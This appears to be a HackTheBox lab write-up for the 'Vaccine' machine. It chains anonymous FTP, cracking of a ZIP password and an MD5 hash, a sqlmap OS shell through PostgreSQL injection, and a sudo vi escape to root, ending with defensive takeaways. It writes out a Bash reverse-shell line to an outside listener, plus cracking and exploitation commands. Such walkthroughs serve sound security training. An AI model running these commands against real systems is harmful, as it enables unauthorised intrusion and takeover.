# Vaccine

This is a HackTheBox Starting Point lab focused on anonymous FTP enumeration, exposed backup analysis, password cracking, authenticated PostgreSQL injection, operating-system command execution, and Linux privilege escalation through an unsafe sudo rule.

## Lab Summary

| Item | Detail |
| --- | --- |
| Platform | HackTheBox |
| Machine | Vaccine |
| Target | `10.129.139.52` |
| Operating System | Ubuntu Linux |
| Initial Vector | Anonymous FTP access to an encrypted web backup |
| Exploitation | PostgreSQL injection in the authenticated `search` parameter |
| Privilege Escalation | Unsafe `sudo` access to `vi` |
| Testing Date | 2026-09-18 |

## Reconnaissance

I used RustScan with Nmap default scripts and service detection:

```bash
target=10.129.139.52
rustscan --ulimit 5000 -a $target -- -sC -sV
```

Three TCP services were exposed:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
```

Nmap also reported that anonymous FTP login was enabled and that the FTP root contained `backup.zip`.

## Anonymous FTP Access

I connected with the `anonymous` account and downloaded the backup archive:

```bash
ftp $target
```

```text
Name: anonymous
230 Login successful.
ftp> ls -la
-rwxr-xr-x    1 0  0  2533 Apr 13 2021 backup.zip
ftp> get backup.zip
```

The archive was encrypted, so a normal extraction attempt failed.

## Backup Password Recovery

I tested the archive against `rockyou.txt` with `fcrackzip`:

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```

The archive password was recovered:

```text
PASSWORD FOUND!!!!: pw == 741852963
```

After extracting the archive, it contained the web application's `index.php` and `style.css` files:

```bash
unzip backup.zip
```

## Source Code and Credential Recovery

The PHP source contained the login username and a hard-coded unsalted MD5 password hash:

```php
if ($_POST['username'] === 'admin' &&
    md5($_POST['password']) === '2cb42f8734ea607eefed3b70af13bbd3') {
    $_SESSION['login'] = 'true';
    header('Location: dashboard.php');
}
```

I saved the hash and identified it as raw MD5. John the Ripper recovered the plaintext password using `rockyou.txt`:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
qwerty789        (?)
```

The recovered credentials were:

```text
Username: admin
Password: qwerty789
```

I used them to authenticate to the MegaCorp web application.

## SQL Injection

After login, the dashboard exposed a `search` GET parameter. I supplied the authenticated PHP session cookie to sqlmap:

```bash
sqlmap -u "http://$target/dashboard.php?search=" \
  --os-shell \
  --cookie='PHPSESSID=<session-id>'
```

Sqlmap confirmed that `search` was vulnerable to multiple PostgreSQL injection techniques:

```text
Parameter: search (GET)
Type: boolean-based blind
Type: error-based
Type: stacked queries
Type: time-based blind

back-end DBMS: PostgreSQL
```

The database user had DBA privileges. Sqlmap therefore used PostgreSQL `COPY ... FROM PROGRAM` functionality to provide an operating-system command shell.

## Initial Shell

From sqlmap's OS shell, I created and executed a Bash reverse-shell script:

```bash
os-shell> echo "bash -i >& /dev/tcp/10.10.15.32/1337 0>&1" > shell.sh
os-shell> bash shell.sh
```

I received the connection with Netcat:

```bash
nc -lvnp 1337
```

```text
connect to [10.10.15.32] from (UNKNOWN) [10.129.139.52] 35300
postgres@vaccine:/var/lib/postgresql/11/main$
```

## User Flag

The user proof was stored in the PostgreSQL user's home directory:

```bash
cat /var/lib/postgresql/user.txt
```

```text
ec9b13ca4d6229cd5cc1e09980965bf7
```

## Privilege Escalation

Sudo enumeration showed that `postgres` could run `vi` as any user. The captured session did not record a password prompt:

```bash
sudo -l
```

```text
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Because `vi` supports shell commands, I opened the permitted file through sudo and spawned Bash from inside the editor:

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside `vi`:

```vim
:!/bin/bash
```

The resulting shell ran as root:

```text
root@vaccine:/var/lib/postgresql#
```

## Root Flag

```bash
cat /root/root.txt
```

```text
dd6e058e814260bc70e9bbdef2715849
```

## Attack Path

```text
RustScan and Nmap
        |
        v
Anonymous FTP access
        |
        v
Encrypted backup.zip downloaded
        |
        v
Weak ZIP password cracked
        |
        v
PHP source and MD5 login hash exposed
        |
        v
Weak admin password recovered
        |
        v
Authenticated dashboard access
        |
        v
PostgreSQL injection in search parameter
        |
        v
DBA privileges enable OS command execution
        |
        v
Shell as postgres
        |
        v
Unsafe sudo vi rule abused
        |
        v
Root shell
```

## Key Takeaways

- Anonymous FTP should never expose application backups or source code.
- Encryption provides little protection when an archive uses a weak dictionary password.
- Fast, unsalted password hashes such as MD5 are unsuitable for password storage.
- SQL injection impact increases sharply when the database account has superuser or operating-system execution privileges.
- Interactive programs such as `vi` are unsafe sudo entries because they can invoke a shell.
- The full compromise required chaining several individually preventable configuration and application weaknesses.

## Related Report

- [Vaccine Penetration Test Report](../../../reports/hackthebox/vaccine-pentest-report.md)

## Disclaimer

This writeup documents activity performed in an authorized HackTheBox lab environment for educational purposes.
